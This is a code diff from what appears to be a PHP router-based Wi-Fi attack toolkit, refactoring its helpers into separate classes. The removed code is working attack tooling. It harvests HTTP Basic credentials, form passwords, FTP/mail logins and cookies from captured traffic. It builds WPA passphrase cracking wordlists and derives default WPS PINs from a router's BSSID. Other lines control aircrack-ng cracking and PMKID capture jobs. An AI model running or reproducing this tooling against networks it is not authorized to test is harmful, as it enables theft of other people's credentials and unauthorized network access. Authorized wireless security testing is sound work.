-                'channel' => '',
-                'frequency' => '',
-                'signal' => '',
-                'security' => 'Open',
-                'capabilities' => [],
-                'lastSeen' => '',
-            ];
-            if (preg_match('/^([0-9a-f:]{17})/i', $block, $match)) {
-                $network['bssid'] = strtolower($match[1]);
-            }
-            if (preg_match('/SSID:\s*(.*)/', $block, $match)) {
-                $ssid = trim($match[1]);
-                $network['ssid'] = $ssid !== '' ? $ssid : '<hidden>';
-            }
-            if (preg_match('/freq:\s*(\d+)/', $block, $match)) {
-                $network['frequency'] = $match[1] . ' MHz';
-                $network['channel'] = $this->freqToChannel((int)$match[1]);
-            }
-            if (preg_match('/signal:\s*([-0-9.]+)\s*dBm/', $block, $match)) {
-                $network['signal'] = $match[1] . ' dBm';
-            }
-            if (preg_match('/last seen:\s*(\d+)\s*ms ago/', $block, $match)) {
-                $network['lastSeen'] = $match[1] . ' ms ago';
-            }
-            $security = [];
-            if (strpos($block, "\tRSN:") !== false) {
-                $security[] = 'WPA2/RSN';
-            }
-            if (strpos($block, "\tWPA:") !== false) {
-                $security[] = 'WPA';
-            }
-            if (stripos($block, 'Authentication suites: SAE') !== false) {
-                $security[] = 'WPA3/SAE';
-            }
-            if (stripos($block, 'WPS:') !== false) {
-                $security[] = 'WPS';
-            }
-            $network['security'] = empty($security) ? 'Open' : implode(', ', array_unique($security));
-            if (preg_match('/capability:\s+(.+)/', $block, $match)) {
-                $network['capabilities'] = preg_split('/\s+/', trim($match[1]));
-            }
-            if ($network['bssid'] !== '') {
-                $networks[] = $network;
-            }
-        }
-        return $networks;
-    }
-
-    private function parseIwinfoScan($output)
-    {
-        $networks = [];
-        $blocks = preg_split('/\n(?=Cell\s+\d+\s+-\s+Address:)/', trim($output));
-        foreach ($blocks as $block) {
-            $block = trim($block);
-            if ($block === '') {
-                continue;
-            }
-
-            $network = [
-                'bssid' => '',
-                'ssid' => '<hidden>',
-                'channel' => '',
-                'frequency' => '',
-                'security' => 'Open',
-                'signal' => '',
-                'lastSeen' => 'now',
-                'capabilities' => [],
-            ];
-
-            if (preg_match('/Address:\s*([0-9A-F:]{17})/i', $block, $match)) {
-                $network['bssid'] = strtolower($match[1]);
-            }
-            if (preg_match('/ESSID:\s*"([^"]*)"/', $block, $match)) {
-                $network['ssid'] = $match[1] !== '' ? $match[1] : '<hidden>';
-            }
-            if (preg_match('/Frequency:\s*([0-9.]+\s*GHz).*Channel:\s*(\d+)/', $block, $match)) {
-                $network['frequency'] = trim($match[1]);
-                $network['channel'] = $match[2];
-            }
-            if (preg_match('/Signal:\s*([-0-9]+\s*dBm)/', $block, $match)) {
-                $network['signal'] = trim($match[1]);
-            }
-            if (preg_match('/Encryption:\s*(.+)/', $block, $match)) {
-                $security = trim($match[1]);
-                $network['security'] = strtolower($security) === 'none' ? 'Open' : $security;
-            }
-            if (preg_match('/Channel Width:\s*(.+)/', $block, $match)) {
-                $network['capabilities'][] = 'width=' . trim($match[1]);
-            }
-
-            if ($network['bssid'] !== '') {
-                $networks[] = $network;
-            }
-        }
-        return $networks;
-    }
     // Extracts the dBm integer from a "-53 dBm" signal string; missing/unparsable
     // signal sorts lowest so a row with a real reading always wins the dedup above.
-    private function signalDbm($net)
-    {
-        if (preg_match('/-?\d+/', (string)($net['signal'] ?? ''), $m)) {
-            return (int)$m[0];
-        }
-        return -999;
-    }
-
-    private function freqToChannel($freq)
-    {
-        if ($freq === 2484) {
-            return '14';
-        }
-        if ($freq >= 2412 && $freq <= 2472) {
-            return (string)(($freq - 2407) / 5);
-        }
-        if ($freq >= 5000 && $freq <= 5900) {
-            return (string)(($freq - 5000) / 5);
-        }
-        return '';
-    }
 
     // =====================================================================
     // Network Recon Command Center: persistent inventory + change detection
@@ -4461,26 +3545,11 @@ SH;
 
     // Convert the mac/ip-keyed inventory map into a sorted list with ports as
     // a plain array (JSON objects -> array) for the frontend table.
-    private function inventoryOutputHosts($hostsAssoc)
-    {
-        $out = [];
-        foreach ($hostsAssoc as $host) {
-            if (!is_array($host)) {
-                continue;
-            }
-            $host['ports'] = is_array($host['ports'] ?? null) ? array_values($host['ports']) : [];
-            $out[] = $host;
-        }
-        usort($out, function ($a, $b) {
-            return strcmp($a['ip'] ?? '', $b['ip'] ?? '');
-        });
-        return $out;
-    }
 
     public function getNetworkInventory()
     {
         $inv = $this->readInventory();
-        $hosts = $this->inventoryOutputHosts($inv['hosts']);
+        $hosts = WaSystemInfo::inventoryOutputHosts($inv['hosts']);
         return self::setSuccess([
             'updatedAt' => $inv['updatedAt'] ?? '',
             'hosts' => $hosts,
@@ -4528,13 +3597,13 @@ SH;
                     $ports[$pn . '/' . $proto] = [
                         'port' => $pn,
                         'proto' => $proto,
-                        'service' => $this->cleanMetadataText((string)($p['service'] ?? ''), 40),
-                        'version' => $this->cleanMetadataText((string)($p['version'] ?? ''), 80),
+                        'service' => WaValidators::cleanMetadataText((string)($p['service'] ?? ''), 40),
+                        'version' => WaValidators::cleanMetadataText((string)($p['version'] ?? ''), 80),
                     ];
                 }
             }
-            $vendor = $this->cleanMetadataText((string)($host['vendor'] ?? ''), 60);
-            $hostname = $this->cleanMetadataText((string)($host['hostname'] ?? ''), 80);
+            $vendor = WaValidators::cleanMetadataText((string)($host['vendor'] ?? ''), 60);
+            $hostname = WaValidators::cleanMetadataText((string)($host['hostname'] ?? ''), 80);
 
             if (!isset($existing[$key])) {
                 $existing[$key] = [
@@ -4574,7 +3643,7 @@ SH;
 
         return self::setSuccess([
             'updatedAt' => $now,
-            'hosts' => $this->inventoryOutputHosts($existing),
+            'hosts' => WaSystemInfo::inventoryOutputHosts($existing),
             'hostCount' => count($existing),
             'changes' => ['newHosts' => $newHosts, 'newPorts' => $newPorts],
         ]);
@@ -4669,7 +3738,7 @@ SH;
             return self::setError($resolved['error']);
         }
         $dev = $resolved['dev'];
-        if (!$this->isSafeInterfaceName($dev)) {
+        if (!WaValidators::isSafeInterfaceName($dev)) {
             return self::setError('Resolved interface name is not safe to use.');
         }
         if (!$this->ensureDir($this->sniffJobDir())) {
@@ -4715,7 +3784,7 @@ SH;
     public function sniffStatus()
     {
         $jobId = $this->request['jobId'] ?? '';
-        if (!$this->isSafeJobId($jobId)) {
+        if (!WaValidators::isSafeJobId($jobId)) {
             return self::setError('Invalid capture job.');
         }
         $paths = $this->sniffJobPaths($jobId);
@@ -4729,7 +3798,7 @@ SH;
             'pending' => $pending,
             'jobId' => $jobId,
             'meta' => $meta,
-            'findings' => $this->parseSniffCapture($paths),
+            'findings' => WaParsers::parseSniffCapture($paths),
             'error' => trim($this->tailFile($paths['err'], 2000)),
         ]);
     }
@@ -4737,7 +3806,7 @@ SH;
     public function stopSniff()
     {
         $jobId = $this->request['jobId'] ?? '';
-        if (!$this->isSafeJobId($jobId)) {
+        if (!WaValidators::isSafeJobId($jobId)) {
             return self::setError('Invalid capture job.');
         }
         $paths = $this->sniffJobPaths($jobId);
@@ -4750,7 +3819,7 @@ SH;
     public function downloadSniff()
     {
         $jobId = $this->request['jobId'] ?? '';
-        if (!$this->isSafeJobId($jobId)) {
+        if (!WaValidators::isSafeJobId($jobId)) {
             return self::setError('Invalid capture job.');
         }
         $paths = $this->sniffJobPaths($jobId);
@@ -4772,7 +3841,7 @@ SH;
     public function deleteSniff()
     {
         $jobId = $this->request['jobId'] ?? '';
-        if (!$this->isSafeJobId($jobId)) {
+        if (!WaValidators::isSafeJobId($jobId)) {
             return self::setError('Invalid capture job.');
         }
         $paths = $this->sniffJobPaths($jobId);
@@ -4791,183 +3860,6 @@ SH;
             }
         }
         return self::setSuccess(['deleted' => true, 'jobId' => $jobId]);
-    }
-
-    private function ipFromToken($tok)
-    {
-        // tcpdump renders endpoints as "10.0.0.5.51000" (ip.port); strip the port.
-        if (preg_match('/^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(?:\.\d+)?$/', $tok, $m)) {
-            return $m[1];
-        }
-        return $tok;
-    }
-
-    private function parseSniffCapture($paths)
-    {
-        $empty = [
-            'dns' => [], 'http' => [], 'creds' => [], 'cookies' => [],
-            'counts' => ['dns' => 0, 'http' => 0, 'creds' => 0, 'cookies' => 0],
-            'pcapBytes' => 0, 'clients' => [],
-        ];
-        $files = glob($paths['pcap'] . '*');
-        if (empty($files)) {
-            return $empty;
-        }
-        $tcpdump = trim((string)shell_exec('command -v tcpdump 2>/dev/null')) ?: 'tcpdump';
-        $text = '';
-        $pcapBytes = 0;
-        foreach ($files as $f) {
-            $pcapBytes += (int)@filesize($f);
-            if (strlen($text) < 700000) {
-                $text .= (string)shell_exec($tcpdump . ' -r ' . escapeshellarg($f) . ' -A -n -s 0 2>/dev/null | head -c 400000');
-                $text .= "\n";
-            }
-        }
-        $empty['pcapBytes'] = $pcapBytes;
-        if (trim($text) === '') {
-            return $empty;
-        }
-
-        $dns = [];
-        $http = [];
-        $creds = [];
-        $cookies = [];
-        $clients = [];
-
-        $curSrc = '';
-        $curDst = '';
-        $curHost = '';
-        foreach (explode("\n", $text) as $raw) {
-            $line = rtrim($raw, "\r");
-            if (preg_match('/^\d\d:\d\d:\d\d\.\d+ IP6?\s+(\S+?)\s+>\s+(\S+?):/', $line, $m)) {
-                $curSrc = $this->ipFromToken($m[1]);
-                $curDst = $this->ipFromToken($m[2]);
-                $curHost = '';
-                if (preg_match('/^\d{1,3}(\.\d{1,3}){3}$/', $curSrc)) {
-                    $clients[$curSrc] = true;
-                }
-                if (strpos($line, '.53:') !== false && preg_match_all('/\b(?:A|AAAA|CNAME)\??\s+([A-Za-z0-9]([A-Za-z0-9._-]*[A-Za-z0-9])?)/', $line, $dm)) {
-                    foreach ($dm[1] as $dom) {
-                        $dom = strtolower(rtrim($dom, '.'));
-                        if ($dom === '' || strpos($dom, '.') === false) {
-                            continue;
-                        }
-                        $k = $curSrc . '|' . $dom;
-                        $dns[$k] = ($dns[$k] ?? 0) + 1;
-                    }
-                }
-                continue;
-            }
-            $t = trim($line);
-            if ($t === '') {
-                continue;
-            }
-            if (preg_match('#^(GET|POST|HEAD|PUT|DELETE|OPTIONS|PATCH)\s+(\S+)\s+HTTP/#', $t, $rm)) {
-                $http[] = ['client' => $curSrc, 'method' => $rm[1], 'url' => substr($rm[2], 0, 120), 'host' => '', 'ua' => ''];
-                continue;
-            }
-            if (stripos($t, 'Host:') === 0) {
-                $curHost = substr(trim(substr($t, 5)), 0, 80);
-                for ($i = count($http) - 1; $i >= 0 && $i >= count($http) - 4; $i--) {
-                    if ($http[$i]['client'] === $curSrc && $http[$i]['host'] === '') {
-                        $http[$i]['host'] = $curHost;
-                        break;
-                    }
-                }
-                continue;
-            }
-            if (stripos($t, 'User-Agent:') === 0) {
-                $ua = substr(trim(substr($t, 11)), 0, 120);
-                for ($i = count($http) - 1; $i >= 0 && $i >= count($http) - 4; $i--) {
-                    if ($http[$i]['client'] === $curSrc && $http[$i]['ua'] === '') {
-                        $http[$i]['ua'] = $ua;
-                        break;
-                    }
-                }
-                continue;
-            }
-            if (stripos($t, 'Authorization: Basic ') === 0) {
-                $dec = base64_decode(trim(substr($t, 21)), true);
-                if ($dec !== false && strpos($dec, ':') !== false && ctype_print($dec)) {
-                    $creds[] = ['client' => $curSrc, 'host' => $curHost, 'type' => 'HTTP Basic', 'detail' => substr($dec, 0, 120)];
-                }
-                continue;
-            }
-            if (stripos($t, 'Cookie:') === 0) {
-                $k = $curSrc . '|' . $curHost;
-                if (!isset($cookies[$k])) {
-                    $cookies[$k] = ['client' => $curSrc, 'host' => $curHost, 'cookie' => substr(trim(substr($t, 7)), 0, 160)];
-                }
-                continue;
-            }
-            if (preg_match('/(?:^|&)(?:pass|passwd|password|pwd|pass1)=([^&\s]{1,64})/i', $t, $pm)) {
-                $user = '';
-                if (preg_match('/(?:^|&)(?:user|username|login|email|usr|log)=([^&\s]{1,64})/i', $t, $um)) {
-                    $user = $um[1];
-                }
-                $creds[] = ['client' => $curSrc, 'host' => $curHost, 'type' => 'Form POST', 'detail' => ($user !== '' ? $user . ' : ' : '') . $pm[1]];
-                continue;
-            }
-            if (preg_match('/^(USER|PASS)\s+(\S+)/', $t, $fm)) {
-                $creds[] = ['client' => $curSrc, 'host' => $curDst, 'type' => 'FTP/Mail', 'detail' => $fm[1] . ' ' . substr($fm[2], 0, 60)];
-                continue;
-            }
-        }
-
-        $dnsList = [];
-        foreach ($dns as $k => $count) {
-            $parts = explode('|', $k, 2);
-            $dnsList[] = ['client' => $parts[0], 'domain' => $parts[1] ?? '', 'count' => $count];
-        }
-        usort($dnsList, function ($a, $b) {
-            return $b['count'] - $a['count'];
-        });
-        $dnsList = array_slice($dnsList, 0, 200);
-
-        $seen = [];
-        $httpList = [];
-        foreach ($http as $e) {
-            $sig = $e['client'] . '|' . $e['host'] . '|' . $e['method'] . '|' . $e['url'];
-            if (isset($seen[$sig])) {
-                continue;
-            }
-            $seen[$sig] = true;
-            $httpList[] = $e;
-            if (count($httpList) >= 200) {
-                break;
-            }
-        }
-
-        $seenC = [];
-        $credList = [];
-        foreach ($creds as $e) {
-            $sig = $e['type'] . '|' . $e['detail'];
-            if (isset($seenC[$sig])) {
-                continue;
-            }
-            $seenC[$sig] = true;
-            $credList[] = $e;
-            if (count($credList) >= 100) {
-                break;
-            }
-        }
-
-        $cookieList = array_slice(array_values($cookies), 0, 100);
-
-        return [
-            'dns' => $dnsList,
-            'http' => $httpList,
-            'creds' => $credList,
-            'cookies' => $cookieList,
-            'counts' => [
-                'dns' => count($dnsList),
-                'http' => count($httpList),
-                'creds' => count($credList),
-                'cookies' => count($cookieList),
-            ],
-            'pcapBytes' => $pcapBytes,
-            'clients' => array_keys($clients),
-        ];
     }
 
     // =====================================================================
@@ -5004,11 +3896,6 @@ SH;
         return trim((string)shell_exec('/usr/bin/pgrep -x aircrack-ng 2>/dev/null')) !== '';
     }
 
-    private function isSafeWordlistName($name)
-    {
-        return is_string($name) && preg_match('/^[A-Za-z0-9._-]{1,64}$/', $name) && strpos($name, '..') === false;
-    }
-
     public function listCrackSources()
     {
         $dir = $this->captureJobDir();
@@ -5016,7 +3903,7 @@ SH;
         if (is_dir($dir)) {
             foreach (glob($dir . '/*.json') as $metaPath) {
                 $jobId = basename($metaPath, '.json');
-                if (!$this->isSafeJobId($jobId)) {
+                if (!WaValidators::isSafeJobId($jobId)) {
                     continue;
                 }
                 $paths = $this->captureJobPaths($jobId);
@@ -5063,73 +3950,6 @@ SH;
         return self::setSuccess(['wordlists' => $lists]);
     }
 
-    private function commonPskList()
-    {
-        // Curated common WPA/WPA2 pre-shared keys (all >= 8 chars).
-        return [
-            '12345678', '123456789', '1234567890', 'password', 'password1', 'password123',
-            'qwerty123', 'qwertyuiop', 'abcd1234', 'abc12345', '1qaz2wsx', 'q1w2e3r4',
-            '11111111', '00000000', '123123123', '12341234', '87654321', 'iloveyou',
-            'welcome1', 'welcome123', 'admin123', 'administrator', 'letmein1', 'changeme',
-            'internet', 'wireless', 'password!', 'p@ssw0rd', 'passw0rd', 'sunshine1',
-            'football1', 'baseball1', 'superman1', 'trustno1', 'whatever1', 'dragon123',
-            'monkey123', 'master123', 'shadow123', 'michael1', 'jennifer1', 'computer1',
-            'princess1', 'starwars1', 'freedom1', 'samsung1', 'default1', 'homewifi1',
-            'mypassword', 'mypassword1', 'wifipassword', 'network1', 'router123', 'linksys1',
-            'netgear1', 'dlink123', 'tplink123', 'connect1', 'guest1234', 'family123',
-            'welcome2024', 'welcome2025', 'summer2024', 'winter2024', 'spring2024', 'autumn2024',
-            '10203040', '13579246', '24681357', 'a1b2c3d4', 'asdfghjkl', 'zxcvbnm123',
-            '55555555', '99999999', '12121212', '77777777', 'test1234', 'demo1234',
-            'qazwsxedc', '1234qwer', 'qwer1234', 'pass1234', 'secret123', 'hello123',
-            'love1234', 'money123', 'happy123', 'ninja123', 'ranger123', 'hunter123',
-        ];
-    }
-
-    private function digitsWordlist()
-    {
-        $out = [];
-        for ($d = 0; $d <= 9; $d++) {
-            $out[] = str_repeat((string)$d, 8);
-        }
-        $asc = '0123456789';
-        for ($i = 0; $i + 8 <= 10; $i++) {
-            $out[] = substr($asc, $i, 8);
-        }
-        $desc = '9876543210';
-        for ($i = 0; $i + 8 <= 10; $i++) {
-            $out[] = substr($desc, $i, 8);
-        }
-        // yyyymmdd birthdays — a realistic bounded PSK space (~19k entries).
-        for ($y = 1960; $y <= 2015; $y++) {
-            for ($m = 1; $m <= 12; $m++) {
-                for ($day = 1; $day <= 28; $day++) {
-                    $out[] = sprintf('%04d%02d%02d', $y, $m, $day);
-                }
-            }
-        }
-        return $out;
-    }
-
-    private function ssidWordlist($ssid)
-    {
-        $bases = array_values(array_unique([$ssid, strtolower($ssid), strtoupper($ssid), ucfirst(strtolower($ssid))]));
-        $suffixes = [
-            '', '1', '12', '123', '1234', '12345', '123456', '1234567', '12345678',
-            '2020', '2021', '2022', '2023', '2024', '2025', '@123', '@1234', '!', '!123',
-            '#123', '00', '007', 'password', 'wifi', 'admin',
-        ];
-        $out = [];
-        foreach ($bases as $b) {
-            foreach ($suffixes as $s) {
-                $out[] = $b . $s;
-            }
-            for ($n = 0; $n <= 999; $n++) {
-                $out[] = $b . $n;
-            }
-        }
-        return $out;
-    }
-
     public function generateWordlist()
     {
         $type = (string)($this->request['type'] ?? 'common');
@@ -5140,22 +3960,22 @@ SH;
             return self::setError('Unable to create wordlist storage.');
         }
         if ($type === 'common') {
-            $words = $this->commonPskList();
+            $words = WaWordlists::commonPskList();
             $name = 'common-psk.txt';
         } elseif ($type === 'digits') {
-            $words = $this->digitsWordlist();
+            $words = WaWordlists::digitsWordlist();
             $name = 'digits-dates.txt';
         } else {
             $ssid = trim((string)($this->request['ssid'] ?? ''));
             if ($ssid === '') {
                 return self::setError('Enter the target SSID to derive a wordlist.');
             }
-            $words = $this->ssidWordlist($ssid);
+            $words = WaWordlists::ssidWordlist($ssid);
             $slug = preg_replace('/[^A-Za-z0-9]/', '', $ssid);
             $slug = ($slug === '') ? 'derived' : substr($slug, 0, 20);
             $name = 'ssid-' . $slug . '.txt';
         }
-        if (!$this->isSafeWordlistName($name)) {
+        if (!WaValidators::isSafeWordlistName($name)) {
             $name = 'wordlist.txt';
         }
         // WPA keys are 8-63 chars; drop anything outside that so aircrack skips nothing.
@@ -5170,7 +3990,7 @@ SH;
     public function deleteWordlist()
     {
         $name = (string)($this->request['name'] ?? '');
-        if (!$this->isSafeWordlistName($name)) {
+        if (!WaValidators::isSafeWordlistName($name)) {
             return self::setError('Invalid wordlist name.');
         }
         $path = $this->wordlistDir() . '/' . $name;
@@ -5230,7 +4050,7 @@ SH;
             $name .= '.txt';
         }
         $name = substr($name, -64);
-        if (!$this->isSafeWordlistName($name)) {
+        if (!WaValidators::isSafeWordlistName($name)) {
             return self::setError('Invalid wordlist name.');
         }
         $payload = $this->decodeUploadPayload();
@@ -5319,9 +4139,9 @@ SH;
         if (strlen($bssid) === 12) {
             $bssid = implode(':', str_split($bssid, 2));
         }
-        $ssid = $this->cleanSsid($ssid !== '' ? $ssid : (string)($this->request['ssid'] ?? ''));
+        $ssid = WaParsers::cleanSsid($ssid !== '' ? $ssid : (string)($this->request['ssid'] ?? ''));
 
-        if (!$this->isSafeBssid($bssid)) {
+        if (!WaValidators::isSafeBssid($bssid)) {
             foreach ($paths as $p) { @unlink($p); }
             return self::setError('No BSSID found in the capture. Re-upload and provide the target BSSID (aa:bb:cc:dd:ee:ff).');
         }
@@ -5354,7 +4174,7 @@ SH;
     public function deleteCrackSource()
     {
         $jobId = (string)($this->request['jobId'] ?? '');
-        if (!$this->isSafeJobId($jobId)) {
+        if (!WaValidators::isSafeJobId($jobId)) {
             return self::setError('Invalid capture.');
         }
         $paths = $this->captureJobPaths($jobId);
@@ -5376,11 +4196,11 @@ SH;
             return self::setError('A crack job is already running. Stop it first.');
         }
         $captureId = (string)($this->request['captureId'] ?? '');
-        if (!$this->isSafeJobId($captureId)) {
+        if (!WaValidators::isSafeJobId($captureId)) {
             return self::setError('Invalid capture selection.');
         }
         $wordlist = (string)($this->request['wordlist'] ?? '');
-        if (!$this->isSafeWordlistName($wordlist)) {
+        if (!WaValidators::isSafeWordlistName($wordlist)) {
             return self::setError('Invalid wordlist selection.');
         }
         $wlPath = $this->wordlistDir() . '/' . $wordlist;
@@ -5394,7 +4214,7 @@ SH;
         $capMeta = json_decode((string)@file_get_contents($capPaths['meta']), true);
         $capMeta = is_array($capMeta) ? $capMeta : [];
         $bssid = strtolower((string)($capMeta['target']['bssid'] ?? ''));
-        if (!$this->isSafeBssid($bssid)) {
+        if (!WaValidators::isSafeBssid($bssid)) {
             return self::setError('The capture has no valid target BSSID.');
         }
         if (!$this->ensureDir($this->crackJobDir())) {
@@ -5438,7 +4258,7 @@ SH;
     public function crackStatus()
     {
         $jobId = $this->request['jobId'] ?? '';
-        if (!$this->isSafeJobId($jobId)) {
+        if (!WaValidators::isSafeJobId($jobId)) {
             return self::setError('Invalid crack job.');
         }
         $paths = $this->crackJobPaths($jobId);
@@ -5494,7 +4314,7 @@ SH;
     public function stopCrack()
     {
         $jobId = $this->request['jobId'] ?? '';
-        if (!$this->isSafeJobId($jobId)) {
+        if (!WaValidators::isSafeJobId($jobId)) {
             return self::setError('Invalid crack job.');
         }
         $paths = $this->crackJobPaths($jobId);
@@ -5506,94 +4326,18 @@ SH;
 
     // --- WPS default-PIN intelligence (pure PHP, no external tools) ---
 
-    private function macToFloat($bssid)
-    {
-        $hex = str_replace(':', '', strtolower($bssid));
-        $val = 0.0;
-        for ($i = 0; $i < strlen($hex); $i++) {
-            $val = $val * 16 + hexdec($hex[$i]);
-        }
-        return $val;
-    }
-
-    private function wpsChecksum($pin)
-    {
-        $accum = 0;
-        $t = (int)$pin;
-        while ($t) {
-            $accum += 3 * ($t % 10);
-            $t = intdiv($t, 10);
-            $accum += $t % 10;
-            $t = intdiv($t, 10);
-        }
-        return (10 - $accum % 10) % 10;
-    }
-
     // Classic ComputePIN: 7-digit seed -> append the WPS checksum digit.
     // fmod keeps the math exact on the router's 32-bit PHP (48-bit MAC > 2^31).
-    private function wpsGenPin($seedFloat)
-    {
-        $pin = (int)fmod($seedFloat, 10000000.0);
-        $pin = $pin * 10 + $this->wpsChecksum($pin);
-        return str_pad((string)$pin, 8, '0', STR_PAD_LEFT);
-    }
-
-    private function wpsPinCandidates($bssid)
-    {
-        $mac = $this->macToFloat($bssid);
-        $out = [];
-        $add = function ($algo, $pin) use (&$out) {
-            $out[] = ['algo' => $algo, 'pin' => $pin];
-        };
-
-        // ComputePIN family — seed = the low N bits of the MAC.
-        $masks = [
-            24 => 16777216.0, 28 => 268435456.0, 32 => 4294967296.0,
-            36 => 68719476736.0, 40 => 1099511627776.0, 44 => 17592186044416.0,
-            48 => 281474976710656.0,
-        ];
-        foreach ($masks as $bits => $mod) {
-            $add('ComputePIN-' . $bits, $this->wpsGenPin(fmod($mac, $mod)));
-        }
-
-        // D-Link default algorithm (derived from the low 24 bits / NIC).
-        $nic = (int)fmod($mac, 16777216.0);
-        foreach ([0, 1] as $delta) {
-            $n = $nic + $delta;
-            $pin = $n ^ 0x55AA55;
-            $pin ^= ((($pin & 0xF) << 4) + (($pin & 0xF) << 8) + (($pin & 0xF) << 12) + (($pin & 0xF) << 16) + (($pin & 0xF) << 20));
-            $pin = $pin % 10000000;
-            if ($pin < 1000000) {
-                $pin += (($pin % 9) * 1000000) + 1000000;
-            }
-            $add('D-Link' . ($delta ? '+1' : ''), str_pad((string)($pin * 10 + $this->wpsChecksum($pin)), 8, '0', STR_PAD_LEFT));
-        }
-
-        // Well-known static defaults.
-        $add('Static default', '12345670');
-        $add('Static default', '00000000');
-
-        $seen = [];
-        $res = [];
-        foreach ($out as $c) {
-            if (isset($seen[$c['pin']])) {
-                continue;
-            }
-            $seen[$c['pin']] = true;
-            $res[] = $c;
-        }
-        return $res;
-    }
 
     public function computeWpsPins()
     {
         $bssid = strtolower(trim((string)($this->request['bssid'] ?? '')));
-        if (!$this->isSafeBssid($bssid)) {
+        if (!WaValidators::isSafeBssid($bssid)) {
             return self::setError('Enter a valid BSSID (aa:bb:cc:dd:ee:ff).');
         }
         return self::setSuccess([
             'bssid' => $bssid,
-            'pins' => $this->wpsPinCandidates($bssid),
+            'pins' => WaWordlists::wpsPinCandidates($bssid),
         ]);
     }
 
@@ -5629,11 +4373,11 @@ SH;
     public function startClientless()
     {
         $bssid = strtolower(trim((string)($this->request['bssid'] ?? '')));
-        $ssid = $this->cleanSsid((string)($this->request['ssid'] ?? ''));
+        $ssid = WaParsers::cleanSsid((string)($this->request['ssid'] ?? ''));
         $duration = (int)($this->request['duration'] ?? 60);
         $mode = (($this->request['mode'] ?? 'pmkid') === 'full') ? 'full' : 'pmkid';
 
-        if (!$this->isSafeBssid($bssid)) {
+        if (!WaValidators::isSafeBssid($bssid)) {
             return self::setError('Invalid target BSSID.');
         }
         if ($duration < 15 || $duration > 180) {
@@ -5827,7 +4571,7 @@ SHELL;
     public function clientlessStatus()
     {
         $jobId = $this->request['jobId'] ?? '';
-        if (!$this->isSafeJobId($jobId)) {
+        if (!WaValidators::isSafeJobId($jobId)) {
             return self::setError('Invalid clientless job.');
         }
         $paths = $this->captureJobPaths($jobId);
@@ -5876,7 +4620,7 @@ SHELL;
     public function stopClientless()
     {
         $jobId = $this->request['jobId'] ?? '';
-        if (!$this->isSafeJobId($jobId)) {
+        if (!WaValidators::isSafeJobId($jobId)) {
             return self::setError('Invalid clientless job.');
         }
         $paths = $this->captureJobPaths($jobId);
